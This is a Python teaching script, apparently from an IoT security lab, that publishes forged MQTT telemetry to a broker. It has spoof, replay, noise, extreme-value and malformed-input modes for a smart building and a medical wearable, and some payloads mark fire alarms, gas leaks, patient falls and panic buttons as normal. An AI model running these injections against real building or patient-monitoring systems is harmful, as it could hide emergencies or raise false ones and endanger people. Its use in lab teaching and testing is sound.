#!/usr/bin/env python3
"""Reusable SISEN MQTT-layer attack demonstrations.

These attacks intentionally publish bounded, easy-to-observe MQTT messages for
teaching. They do not attempt to exploit a broker; they demonstrate what weak
source validation and unauthenticated telemetry can look like at the application
layer.
"""

import argparse
import time

import paho.mqtt.publish as publish


SCENARIOS = {
    "building": {
        "description": "Smart Building telemetry",
        "topics": {
            "temperature": "building/temperature",
            "humidity": "building/humidity",
            "air_quality": "building/air_quality",
            "occupancy": "building/occupancy",
            "fire_alarm": "building/fire_alarm",
            "gas_leak": "building/gas_leak",
        },
        "spoofed": {
            "temperature": "23.40",
            "humidity": "41.20",
            "air_quality": "620",
            "occupancy": "Occupied",
            "fire_alarm": "Normal",
            "gas_leak": "Normal",
        },
        "extreme": {
            "temperature": "85.00",
            "humidity": "5.00",
            "air_quality": "5000",
            "occupancy": "Occupied",
            "fire_alarm": "Fire detected",
            "gas_leak": "Gas detected",
        },
        "replay": {
            "temperature": "21.10",
            "humidity": "46.00",
            "air_quality": "590",
            "occupancy": "Vacant",
            "fire_alarm": "Normal",
            "gas_leak": "Normal",
        },
        "malformed": {
            "temperature": "not-a-temperature",
            "humidity": '{"unexpected":"json"}',
            "air_quality": "-999",
            "occupancy": "",
            "fire_alarm": "???",
            "gas_leak": "",
        },
    },
    "medical": {
        "description": "Medical wearable telemetry",
        "topics": {
            "heart_rate": "patient/vitals/heart_rate",
            "spo2": "patient/vitals/spo2",
            "blood_pressure": "patient/vitals/blood_pressure",
            "fall_alert": "patient/patient-01/alerts/fall_alert",
            "panic_button": "patient/patient-01/alerts/panic_button",
            "battery_status": "patient/patient-01/alerts/battery_status",
        },
        "spoofed": {
            "heart_rate": "78",
            "spo2": "98",
            "blood_pressure": "122/78",
            "fall_alert": "No fall",
            "panic_button": "Not pressed",
            "battery_status": "Normal",
        },
        "extreme": {
            "heart_rate": "145",
            "spo2": "82",
            "blood_pressure": "190/120",
            "fall_alert": "Fall detected",
            "panic_button": "Pressed",
            "battery_status": "Battery critical",
        },
        "replay": {
            "heart_rate": "67",
            "spo2": "99",
            "blood_pressure": "118/76",
            "fall_alert": "No fall",
            "panic_button": "Not pressed",
            "battery_status": "Normal",
        },
        "malformed": {
            "heart_rate": "fast",
            "spo2": "NaN",
            "blood_pressure": "broken",
            "fall_alert": "unknown",
            "panic_button": "maybe",
            "battery_status": "",
        },
    },
}
SCENARIO_ALIASES = {}


ATTACKS = ("spoofed", "extreme", "replay", "noise", "malformed")


def publish_payloads(host, port, topics, payloads, delay):
    for name, payload in payloads.items():
        topic = topics[name]
        print(f"{topic} <- {payload}")
        publish.single(topic, payload, hostname=host, port=port)
        if delay:
            time.sleep(delay)


def run_attack(args):
    scenario = SCENARIO_ALIASES.get(args.scenario, args.scenario)
    profile = SCENARIOS[scenario]
    topics = profile["topics"]

    print(f"SISEN MQTT attack demo: {args.attack}")
    print(f"Scenario: {args.scenario} ({profile['description']})")
    print(f"Broker: {args.host}:{args.port}")
    print()

    if args.attack == "noise":
        payloads = profile["spoofed"]
        for index in range(args.count):
            print(f"Noise burst {index + 1}/{args.count}")
            publish_payloads(args.host, args.port, topics, payloads, args.delay)
        return

    payloads = profile[args.attack]
    repeat_count = args.count if args.attack == "replay" else 1
    for index in range(repeat_count):
        if repeat_count > 1:
            print(f"Replay {index + 1}/{repeat_count}")
        publish_payloads(args.host, args.port, topics, payloads, args.delay)


def main():
    parser = argparse.ArgumentParser(description="Run bounded MQTT-layer SISEN attack demonstrations.")
    parser.add_argument("--scenario", choices=sorted([*SCENARIOS, *SCENARIO_ALIASES]), required=True)
    parser.add_argument("--attack", choices=ATTACKS, required=True)
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--count", type=int, default=5, help="Repeat count for replay/noise attacks.")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between publishes.")
    args = parser.parse_args()

    if args.count < 1:
        parser.error("--count must be at least 1")
    if args.delay < 0:
        parser.error("--delay must be zero or greater")

    run_attack(args)


if __name__ == "__main__":
    main()
